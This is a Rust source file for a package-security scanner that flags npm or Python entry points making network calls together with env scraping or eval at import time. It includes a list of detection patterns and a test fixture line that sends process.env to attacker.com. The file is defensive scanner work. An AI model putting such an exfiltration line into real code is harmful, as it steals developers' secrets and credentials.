//! Import-time payload execution analyser (catches require()-triggered attacks).

use std::fs;
use std::path::{Path, PathBuf};

use crate::traits::Analyser;
use crate::types::{PackageArchive, Result, Signal};

/// Analyser for top-level code execution triggered immediately at module load time.
#[derive(Debug, Default)]
pub struct ImportTimePayloadAnalyser;

impl ImportTimePayloadAnalyser {
    /// Creates a new `ImportTimePayloadAnalyser`.
    pub fn new() -> Self {
        Self
    }
}

fn collect_files(dir: &Path, rel_prefix: &Path, out: &mut Vec<PathBuf>) {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            let rel = rel_prefix.join(entry.file_name());
            if path.is_dir() {
                collect_files(&path, &rel, out);
            } else if path.is_file() {
                out.push(rel);
            }
        }
    }
}

impl Analyser for ImportTimePayloadAnalyser {
    fn analyse(&self, pkg: &PackageArchive) -> Result<Vec<Signal>> {
        let mut signals = Vec::new();
        let mut files = Vec::new();
        collect_files(&pkg.extracted_path, Path::new(""), &mut files);

        for file_path in files {
            let ext = file_path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if ext != "js" && ext != "cjs" && ext != "mjs" && ext != "py" {
                continue;
            }

            let full_path = pkg.extracted_path.join(&file_path);
            let content = match fs::read_to_string(&full_path) {
                Ok(c) => c,
                Err(_) => continue,
            };

            let is_entry_point = file_path.to_string_lossy().contains("index")
                || file_path.to_string_lossy().contains("main")
                || file_path.to_string_lossy().contains("entry");

            if is_entry_point {
                let has_top_level_net = content.contains("http.get(")
                    || content.contains("https.request(")
                    || content.contains("net.connect(")
                    || content.contains("fetch(")
                    || content.contains("urllib.request");

                let has_env_scraping = content.contains("process.env")
                    || content.contains("os.environ");

                let has_eval_or_exec = content.contains("eval(")
                    || content.contains("child_process.exec")
                    || content.contains("subprocess.Popen");

                if has_top_level_net && (has_env_scraping || has_eval_or_exec) {
                    signals.push(Signal::ImportTimeExec {
                        file: file_path.clone(),
                        target_api: "top-level network/eval execution".into(),
                        description: "module triggers network call or code evaluation at import time"
                            .into(),
                    });
                }
            }
        }

        Ok(signals)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{Ecosystem, PackageId, PackageManifest};
    use tempfile::tempdir;

    #[test]
    fn import_time_payload_detection() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("index.js");
        fs::write(
            &file_path,
            "const http = require('http'); http.get('http://attacker.com/' + JSON.stringify(process.env));",
        )
        .unwrap();

        let analyser = ImportTimePayloadAnalyser::new();
        let pkg = PackageArchive {
            id: PackageId {
                name: "asyncapi-payload".into(),
                version: "1.0.0".into(),
                ecosystem: Ecosystem::Npm,
            },
            extracted_path: dir.path().to_path_buf(),
            manifest: PackageManifest::default(),
            tarball: vec![],
        };

        let signals = analyser.analyse(&pkg).unwrap();
        assert_eq!(signals.len(), 1);
        match &signals[0] {
            Signal::ImportTimeExec { file, .. } => {
                assert_eq!(file, &PathBuf::from("index.js"));
            }
            _ => panic!("expected ImportTimeExec signal"),
        }
    }
}
